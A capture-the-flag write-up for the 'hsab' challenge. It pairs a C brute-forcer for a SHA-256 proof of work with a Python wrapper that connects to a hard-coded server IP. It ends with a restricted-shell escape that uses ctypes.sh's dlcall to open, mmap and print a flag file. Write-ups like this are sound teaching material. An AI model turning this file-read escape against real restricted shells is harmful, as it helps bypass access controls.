# hsab

## Solution

The first part of the challenge is to give a proof of work to the server, if the proof of work is correct, we'll get access to a shell. The proof of work is strings which sha256 starts with 20 zeros in binary. The first letters of that string are chosen by the server.

```c
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
// #include <openssl/sha256.h>
#define COMMON_DIGEST_FOR_OPENSSL
#include <CommonCrypto/CommonDigest.h>
#define SHA1 CC_SHA1

char *rand_string(size_t length, char* prefix) {
    static char charset[] = "azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN1234567890";
    char *randomString = NULL;
    int prelen = strlen(prefix);
    int n = 0;

    if (length) {
        randomString = malloc(sizeof(char) * (length + prelen + 1));
        strcpy(randomString, prefix);

        if (randomString) {
            for (n = prelen ; n < length + prelen-1; n++) {
                int key = rand() % (int)(sizeof(charset) - 1);
                randomString[n] = charset[key];
            }
        
            randomString[length + prelen] = 0;
        }
    }

    return randomString;
}

int main(int argc, char* argv[]) {
    int length = 20;
    int n = 0;
    unsigned char digest[32];
    char *out = (char*)malloc(33);
    char* arg = NULL;
    char *rdStr = NULL;

    arg = argv[1];

    srand(time(0));

    while(1) {
        SHA256_CTX c;
        SHA256_Init(&c);
        memset(digest, 0, 32);
        rdStr = rand_string(length, arg);
        SHA256_Update(&c, rdStr, strlen(rdStr));
        SHA256_Final(digest, &c);

        for (n = 0; n < 32; ++n) {
            snprintf(&(out[n*2]), 32*2, "%02x", (unsigned int)digest[n]);
        }

        if (!strncmp("00000", out, 5)) {
            printf("%s\n", rdStr);
            break;
        }

        free(rdStr);
    }

    return 0;
}
```

This program takes in argument the first characters given by the server. It then finds and return a collision that starts with 20 zeros (which is 5 times the character `0` in hexadecimal). 
In order to communicate with the server easily, I wrote a little wrapper in Python.

```python
import socket
import sys
import re
import subprocess

bctf = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #defines the socket
bctf.connect(("104.199.132.199", 2222))

data = bctf.recv(2048)
print data

m = re.match("[^']*'(.*)'.*", data)
if m:
    prefix = m.group(1)

data = bctf.recv(2048)
print data

out = subprocess.check_output(["./LHC", prefix])
print out

bctf.send(out.strip() +"\n")	# Sends the proof of work
data = bctf.recv(2048)
print data

bctf.send(sys.argv[1]+"\n")		# Sends the command given in argument
data = bctf.recv(2048)
print data
data = bctf.recv(2048)
print data

bctf.close()
```

We now have a shell to server. Although it lacks standard tools such as `ls` or `cat`, it's possible to list directories with the command `python wrapper.py "type /home/*"`. That's how we found out that the flag was in the file `/home/ctf/flag.ray`.

Then, we needed to open that file and none of the commands available could do it. But dlcall seemed interesting, because it was possible to call functions from the standard library with it. In order to read the content of the flag file, we needed to open the file, mmap it, and then print it.

Which was made possible with the command `python wrapper.py "dlcall -n fd -r pointer open /home/ctf/flag.ray 0 && dlcall -n mapped -r pointer mmap 0 10 1 1 \$fd 0 && dlcall printf %s \$mapped"`.

## References

 * [https://github.com/taviso/ctypes.sh/wiki](https://github.com/taviso/ctypes.sh/wiki)